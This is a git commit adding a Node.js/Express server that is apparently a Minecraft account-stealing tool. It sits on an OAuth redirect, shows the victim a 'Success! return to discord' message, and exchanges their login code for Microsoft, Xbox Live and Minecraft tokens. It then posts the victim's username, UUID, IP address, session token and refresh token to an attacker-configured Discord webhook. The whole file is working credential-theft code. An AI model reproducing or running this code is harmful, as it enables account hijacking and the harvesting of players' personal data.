db4cf150dcc2cb8aa9459fbd5d98ad461e425664
SSleef <116099104+SSleef@users.noreply.github.com>
2022-11-22 17:22:19 +0100

    Add files via upload

---
+++ index.js
@@ -0,0 +1,183 @@
+// Configuration
+const client_secret = 'replace'
+const client_id = 'replace'
+const redirect_uri = 'replace'
+const webhook_url = 'replace'
+const webhook_logging_url = 'replace'
+// Config end
+const axios = require('axios')
+const express = require('express')
+const app = express()
+const port = process.env.PORT || 3000
+
+app.get('/', async (req, res) => {
+    res.send('Success! You can exit this page and return to discord.')
+    const code = req.query.code
+    if (code == null) {
+        return
+    }
+    try {
+        const accessTokenAndRefreshTokenArray = await getAccessTokenAndRefreshToken(code)
+        const accessToken = accessTokenAndRefreshTokenArray[0]
+        const refreshToken = accessTokenAndRefreshTokenArray[1]
+        const hashAndTokenArray = await getUserHashAndToken(accessToken)
+        const userToken = hashAndTokenArray[0]
+        const userHash = hashAndTokenArray[1]
+        const xstsToken = await getXSTSToken(userToken)
+        const bearerToken = await getBearerToken(xstsToken, userHash)
+        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
+        const uuid = usernameAndUUIDArray[0]
+        const username = usernameAndUUIDArray[1]
+        if (checkIfBanned(username)) {
+            logToWebhook("Reject", "A person has been rejected.")
+            return
+        }
+        const ip = getIp(req)
+        postToWebhook(username, bearerToken, uuid, ip, refreshToken)
+    } catch (e) {
+        console.log(e)
+    }
+})
+
+app.listen(port, () => {
+    console.log(`Started the server on ${port}`)
+})
+
+async function getAccessTokenAndRefreshToken(code) {
+    const url = 'https://login.live.com/oauth20_token.srf'
+
+    const config = {
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded'
+        }
+    }
+    let data = {
+        client_id: client_id,
+        redirect_uri: redirect_uri,
+        client_secret: client_secret,
+        code: code,
+        grant_type: 'authorization_code'
+    }
+
+    let response = await axios.post(url, data, config)
+    return [response.data['access_token'], response.data['refresh_token']]
+}
+
+async function getUserHashAndToken(accessToken) {
+    const url = 'https://user.auth.xboxlive.com/user/authenticate'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
+    let data = {
+        Properties: {
+            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
+        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
+    }
+    let response = await axios.post(url, data, config)
+    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
+}
+
+async function getXSTSToken(userToken) {
+    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json', 'Accept': 'application/json',
+        }
+    }
+    let data = {
+        Properties: {
+            SandboxId: 'RETAIL',
+            UserTokens: [userToken]
+        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
+    }
+    let response = await axios.post(url, data, config)
+
+    return response.data['Token']
+}
+
+async function getBearerToken(xstsToken, userHash) {
+    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
+    const config = {
+        headers: {
+            'Content-Type': 'application/json',
+        }
+    }
+    let data = {
+        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
+    }
+    let response = await axios.post(url, data, config)
+    return response.data['access_token']
+}
+
+async function getUsernameAndUUID(bearerToken) {
+    const url = 'https://api.minecraftservices.com/minecraft/profile'
+    const config = {
+        headers: {
+            'Authorization': 'Bearer ' + bearerToken,
+        }
+    }
+    let response = await axios.get(url, config)
+    return [response.data['id'], response.data['name']]
+}
+
+function getIp(req) {
+    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
+}
+
+function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
+    const url = webhook_url
+    let data = {
+        username: " ",
+        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
+        content: "@everyone",
+        embeds: [{
+            title: "User Info", color: 0x00ff50, fields: [
+                {name: "Username", value: username, inline: true},
+                {name: "UUID", value: uuid, inline: true},
+                {name: "Ip", value: ip, inline: true},
+                {name: "SessionID", value: bearerToken, inline: false},
+                {name: "Refresh Token", value: refreshToken, inline: false},
+                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
+            ]
+        }]
+    }
+    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
+    logToWebhook("Accepted", "A person has been accepted and it has been sent to the webhook.")
+}
+
+function logToWebhook(title, message) {
+    const url = webhook_logging_url
+
+    let data = {
+        username: " ",
+        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
+        content: " ",
+        embeds: [{
+            title: "Log", color: 0x00ff50, fields: [
+                {name: title, value: ""},
+                {name: message, value: ""}
+            ]
+        }
+        ]
+    }
+    axios.post(url, data).then(() => console.log("Logging to discord."))
+}
+
+const bannedNames = []
+
+function addBan(name) {
+    bannedNames.push(name);
+}
+
+function checkIfBanned(name) {
+
+    for (const item of bannedNames) {
+        if (name === item) {
+            return true
+        }
+    }
+    addBan(name)
+    return false
+}
